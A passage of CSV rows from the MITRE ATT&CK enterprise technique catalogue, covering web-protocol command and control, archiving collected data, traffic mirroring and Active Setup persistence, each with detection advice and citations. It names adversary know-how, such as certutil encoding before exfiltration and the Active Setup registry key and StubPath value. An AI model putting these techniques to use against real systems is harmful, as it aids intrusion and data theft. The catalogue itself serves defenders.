Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/001,15 March 2020,29 September 2023,enterprise-attack,1.2,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

Monitor for web traffic to/from known-bad or suspicious domains. ","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,TruKno,,,,,,"(Citation: Unit 42 Inception November 2018),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: Bitdefender StrongPity June 2020),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Cisco Talos Intelligence Group),(Citation: Infoblox Lokibot January 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Nomadic Octopus 2018),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: FireEye admin@338),(Citation: FireEye APT30),(Citation: Check Point APT34 April 2021),(Citation: Talos Zeus Panda Nov 2017),(Citation: FireEye APT33 Guardrail),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Symantec Vasport May 2012),(Citation: ProofPoint Ursnif Aug 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Fidelis INOCNATION),(Citation: Unit42 Cannon Nov 2018),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: ESET InvisiMole June 2018),(Citation: ESET Industroyer),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Kaspersky Regin),(Citation: CheckPoint Naikon May 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: ESET Crutch December 2020),(Citation: Kaspersky Turla),(Citation: Moran 2014),(Citation: Unit 42 Nokki Oct 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: Sofacy DealersChoice),(Citation: Mandiant APT1 Appendix),(Citation: Mandiant FIN13 Aug 2022),(Citation: ThreatStream Evasion Analysis),(Citation: Proofpoint TA505 Mar 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: Intezer TeamTNT September 2020),(Citation: FireEye APT29),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Lotus Blossom Jun 2015),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye APT28),(Citation: McAfee Bankshot),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Gelsemium June 2021),(Citation: F-Secure BlackEnergy 2014),(Citation: Palo Alto Sofacy 06-2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: PWC WellMess C2 August 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: ObjectiveSee AppleJeus 2019),(Citation: Intrinsec Egregor Nov 2020),(Citation: JPCERT ChChes Feb 2017),(Citation: BlackBerry Bahamut),(Citation: JPCert TSCookie March 2018),(Citation: McAfee Night Dragon),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Gigamon BADHATCH Jul 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: objective-see windtail2 jan 2019),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: ClearSky Lazarus Aug 2020),(Citation: Malwarebytes Pony April 2016),(Citation: FireEye APT38 Oct 2018),(Citation: Malwarebytes SmokeLoader 2016),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT10 April 2017),(Citation: 360 Machete Sep 2020),(Citation: Talos Micropsia June 2017),(Citation: Proofpoint NETWIRE December 2020),(Citation: NSA/FBI Drovorub August 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Dell TG-3390),(Citation: Unit 42 NOKKI Sept 2018),(Citation: GitHub Pupy),(Citation: Symantec Remsec IOCs),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: reed thiefquest ransomware analysis),(Citation: Securelist Remexi Jan 2019),(Citation: NCSC Cyclops Blink February 2022),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Booz Allen Hamilton),(Citation: Trend Micro Muddy Water March 2021),(Citation: CISA SoreFang July 2016),(Citation: Unit 42 BackConfig May 2020),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Accenture Lyceum Targets November 2021),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Sofacy Komplex Trojan),(Citation: McAfee Lazarus Nov 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Mandiant APT41),(Citation: FireEye APT19),(Citation: Group IB GrimAgent July 2021),(Citation: Profero APT27 December 2020),(Citation: Recorded Future REDDELTA July 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET Turla Mosquito May 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Volexity SolarWinds),(Citation: cobaltstrike manual),(Citation: Trustwave GoldenSpy June 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCSC APT29 July 2020),(Citation: Dell Sakula),(Citation: Proofpoint TA459 April 2017),(Citation: Unit 42 Playbook Dec 2017),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: ClearSky MuddyWater June 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: GitHub PoshC2),(Citation: Fortinet Diavol July 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: PWC WellMess July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Okrum July 2019),(Citation: F-Secure Cosmicduke),(Citation: MSTIC FoggyWeb September 2021),(Citation: Talos Promethium June 2020),(Citation: Rewterz Sidewinder APT April 2020),(Citation: FireEye Fin8 May 2016),(Citation: BitDefender Chafer May 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Unit42 OilRig Playbook 2023),(Citation: Unit 42 Gamaredon February 2022),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Securelist APT10 March 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Secureworks Karagany July 2019),(Citation: Intezer Doki July 20),(Citation: McAfee Maze March 2020),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Symantec Orangeworm IOCs April 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: FoxIT Wocao December 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: NorthSec 2015 GData Uroburos Tools),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Talos Cobalt Group July 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Juniper IcedID June 2020),(Citation: TrendMicro Taidoor),(Citation: Secureworks MCMD July 2019),(Citation: Unit42 SilverTerrier 2018),(Citation: Cybereason Bazar July 2020),(Citation: ATT Sidewinder January 2021),(Citation: Bitdefender FIN8 July 2021),(Citation: McAfee Dianxun March 2021),(Citation: Microsoft NICKEL December 2021),(Citation: FireEye APT29 Nov 2018),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: BlackBerry Amadey 2020),(Citation: F-Secure The Dukes),(Citation: Scarlet Mimic Jan 2016),(Citation: FireEye APT34 Dec 2017),(Citation: Morphisec ShellTea June 2019),(Citation: Malwarebytes Higaisa 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Qualys LolZarus),(Citation: Trend Micro njRAT 2018),(Citation: Unit42 Redaman January 2019),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: Costa AvosLocker May 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: ESET Gazer Aug 2017),(Citation: Chronicle Winnti for Linux May 2019),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Sofacy),(Citation: S2 Grupo TrickBot June 2017),(Citation: Unit42 Xbash Sept 2018),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye APT34 July 2019),(Citation: Prevailion DarkWatchman 2021),(Citation: Talos GravityRAT),(Citation: IBM TA505 April 2020),(Citation: NCC Group Team9 June 2020),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Medium S2W WhisperGate January 2022),(Citation: FBI FLASH APT39 September 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: Talos Cobalt Strike September 2020),(Citation: Lab52 WIRTE Apr 2019),(Citation: Zscaler Higaisa 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: SecureWorks August 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: DustySky),(Citation: Talos Frankenstein June 2019),(Citation: ESET Dukes October 2019),(Citation: Baumgartner Naikon 2015),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 PingPull Jun 2022),(Citation: TrendMicro TropicTrooper 2015),(Citation: CISA AppleJeus Feb 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Kaspersky Dridex May 2017),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: TrendMicro Gamaredon April 2020),(Citation: McAfee Gold Dragon),(Citation: JPCert BlackTech Malware September 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Anomali Rocke March 2019),(Citation: Microsoft POLONIUM June 2022),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Valak May 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: Anomali Pirate Panda April 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Fortinet Agent Tesla June 2017),(Citation: Malwarebytes Saint Bot April 2021),(Citation: FireEye APT41 March 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Radware Micropsia July 2018),(Citation: FireEye FiveHands April 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub Sliver C2),(Citation: Lazarus RATANKBA),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: ESET Zebrocy May 2019),(Citation: Moran 2013),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Palo Alto Comnie),(Citation: Unit42 Sofacy Dec 2018),(Citation: Unit 42 NETWIRE April 2020),(Citation: Trend Micro TeamTNT),(Citation: Lotus Blossom Dec 2015),(Citation: NTT Security Flagpro new December 2021),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: FireEye Ursnif Nov 2017),(Citation: Donut Github),(Citation: ESET Sednit Part 1),(Citation: Trend Micro DRBControl February 2020),(Citation: NCC Group Chimera January 2021),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Secureworks REvil September 2019),(Citation: RATANKBA),(Citation: TrendMicro BlackTech June 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Unit42 RDAT July 2020),(Citation: CERT-EE Gamaredon January 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: FireEye EPS Awakens Part 2),(Citation: Palo Alto menuPass Feb 2017),(Citation: ESET Telebots Dec 2016),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Talos Konni May 2017),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cyphort EvilBunny Dec 2014),(Citation: ESET TeleBots Oct 2018),(Citation: TrendMicro macOS Dacls May 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: CISA WellMess July 2020),(Citation: Talos Group123),(Citation: HP SVCReady Jun 2022),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Symantec Shuckworm January 2022),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Microsoft GALLIUM December 2019),(Citation: Trusteer Carberp October 2010),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Microsoft SIR Vol 19),(Citation: synack 2016 review),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Github PowerShell Empire),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Volexity OceanLotus Nov 2017),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: McAfee Sodinokibi October 2019),(Citation: Talos ROKRAT),(Citation: FireEye Periscope March 2018),(Citation: Microsoft Actinium February 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Kaspersky Carbanak),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Black Basta October 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Intel 471 REvil March 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Cylance Machete Mar 2017),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: objsee mac malware 2017),(Citation: Cylance Dust Storm),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Mythc Documentation),(Citation: Cybereason Cobalt Kitty 2017),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Talos TinyTurla September 2021),(Citation: ESET Machete July 2019),(Citation: Malwarebytes Dyreza November 2015),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: F-Secure CozyDuke),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Accenture HyperStack October 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: Palo Alto OilRig May 2016),(Citation: IBM Grandoreiro April 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET Gamaredon June 2020),(Citation: ESET Sednit Part 2),(Citation: KISA Operation Muzabi),(Citation: CrowdStrike Putter Panda),(Citation: McAfee Sharpshooter December 2018),(Citation: ESET ComRAT May 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Symantec Dyre June 2015),(Citation: Lazarus APT January 2022),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Cylance Sodinokibi July 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Microsoft HAFNIUM March 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Aqua Kinsing April 2020),(Citation: Unit 42 Valak July 2020),(Citation: Novetta Winnti April 2015),(Citation: Talos PoetRAT October 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Rancor Unit42 June 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Talos ZxShell Oct 2014),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: NCCGroup RokRat Nov 2018),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: wardle evilquest partii),(Citation: CISA ComRAT Oct 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: BitDefender BADHATCH Mar 2021),(Citation: McAfee GhostSecret),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: DigiTrust Agent Tesla Jan 2017),"
T1560.003,attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b,Archive Collected Data: Archive via Custom Method,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",https://attack.mitre.org/techniques/T1560/003,20 February 2020,25 March 2020,enterprise-attack,1.0,Collection,"Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.","Linux, Windows, macOS","File: File Creation, Script: Script Execution",True,T1560,,,,,,,,"(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: ESET Machete July 2019),(Citation: Novetta Blockbuster Loaders),(Citation: CopyKittens Nov 2015),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Attor Oct 2019),(Citation: Visa RawPOS March 2015),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: TrendMicro RawPOS April 2015),(Citation: Bitdefender StrongPity June 2020),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET Okrum July 2019),(Citation: ESET InvisiMole June 2018),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Novetta Blockbuster),(Citation: MSTIC FoggyWeb September 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Talos Promethium June 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Palo Alto Reaver Nov 2017),(Citation: Unit42 OceanLotus 2017),(Citation: Mandiant APT41),(Citation: FireEye NETWIRE March 2019),(Citation: ESET Sednit Part 2),(Citation: Eset Ramsay May 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: FireEye APT30),(Citation: Securelist Kimsuky Sept 2013),(Citation: Unit 42 RGDoor Jan 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: FireEye MESSAGETAP October 2019),(Citation: FireEye FIN6 April 2016),(Citation: Trend Micro FIN6 October 2019),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Dell TG-3390),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ThreatExpert Agent.btz),(Citation: Symantec W32.Duqu),(Citation: Novetta Blockbuster RATs),"
T1560.002,attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6,Archive Collected Data: Archive via Library,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.

Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",https://attack.mitre.org/techniques/T1560/002,20 February 2020,29 March 2020,enterprise-attack,1.0,Collection,"Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","Linux, Windows, macOS","File: File Creation, Script: Script Execution",True,T1560,,,,,,,,"(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Securelist Denis April 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: Mandiant No Easy Breach),(Citation: ESET InvisiMole June 2018),(Citation: ESET InvisiMole June 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: TrendMicro MacOS April 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: MSTIC FoggyWeb September 2021),(Citation: Accenture MUDCARP March 2019),(Citation: Cylance Dust Storm),(Citation: Palo Alto Networks BBSRAT),(Citation: Novetta Blockbuster RATs),"
T1560.001,attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662,Archive Collected Data: Archive via Utility,"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.

Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. 

On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. 

Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",https://attack.mitre.org/techniques/T1560/001,20 February 2020,15 September 2023,enterprise-attack,1.3,Collection,"Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Process: Process Creation",True,T1560,,Mark Wee; Mayan Arora aka Mayan Mohan,,,,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: CrowdStrike IceApple May 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Avira Mustang Panda January 2020),(Citation: NCC Group Chimera January 2021),(Citation: Antiy CERT Ramsay April 2020),(Citation: Mandiant APT1),(Citation: Symantec Elfin Mar 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Morphisec ShellTea June 2019),(Citation: Rclone),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FireEye APT41 Aug 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye APT39 Jan 2019),(Citation: Microsoft HAFNIUM March 2020),(Citation: GitHub PoshC2),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: aptsim),(Citation: Trend Micro Tick November 2019),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: objective-see windtail2 jan 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: ESET Okrum July 2019),(Citation: Cycraft Chimera April 2020),(Citation: FireEye APT37 Feb 2018),(Citation: ESET InvisiMole June 2018),(Citation: Symantec Waterbug Jun 2019),(Citation: Mandiant FIN12 Oct 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Symantec Sowbug Nov 2017),(Citation: Microsoft GALLIUM December 2019),(Citation: Symantec MuddyWater Dec 2018),(Citation: PWC Cloud Hopper April 2017),(Citation: Securelist Calisto July 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET Nomadic Octopus 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Kaspersky MoleRATs April 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Crutch December 2020),(Citation: McAfee Honeybee),(Citation: Eset Ramsay May 2020),(Citation: Symantec Gallmaker Oct 2018),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Symantec Calisto July 2018),(Citation: Symantec Tick Apr 2016),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: objsee mac malware 2017),(Citation: Volexity Exchange Marauder March 2021),(Citation: TechNet Certutil),(Citation: Symantec Cicada November 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Microsoft NICKEL December 2021),(Citation: DFIR Phosphorus November 2021),(Citation: LOLBAS Certutil),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Volexity SolarWinds),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Talos PoetRAT April 2020),(Citation: Radware Micropsia July 2018),(Citation: GitHub Pupy),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT35 2018),"
T1020.001,attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1,Automated Exfiltration: Traffic Duplication,"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)

Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)

Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)

Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",https://attack.mitre.org/techniques/T1020/001,19 October 2020,14 April 2023,enterprise-attack,1.2,Exfiltration,"Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. ","IaaS, Network","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1020,,,,,,,,","
T1547.014,attack-pattern--22522668-ddf6-470b-a027-9d6866679f67,Boot or Logon Autostart Execution: Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.

Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)

Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/014,18 December 2020,22 March 2023,enterprise-attack,1.0,"Persistence, Privilege Escalation","Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\</code>.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1547,,"Bencherchali Nasreddine, @nas_bench, ELIT Security Team (DSSD)",Administrator,,,,,"(Citation: paloalto Tropic Trooper 2016),(Citation: Microsoft PoisonIvy 2017),(Citation: FireEye Regsvr32 Targeting Mongolian Gov),"
T1547.002,attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec,Boot or Logon Autostart Execution: Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)

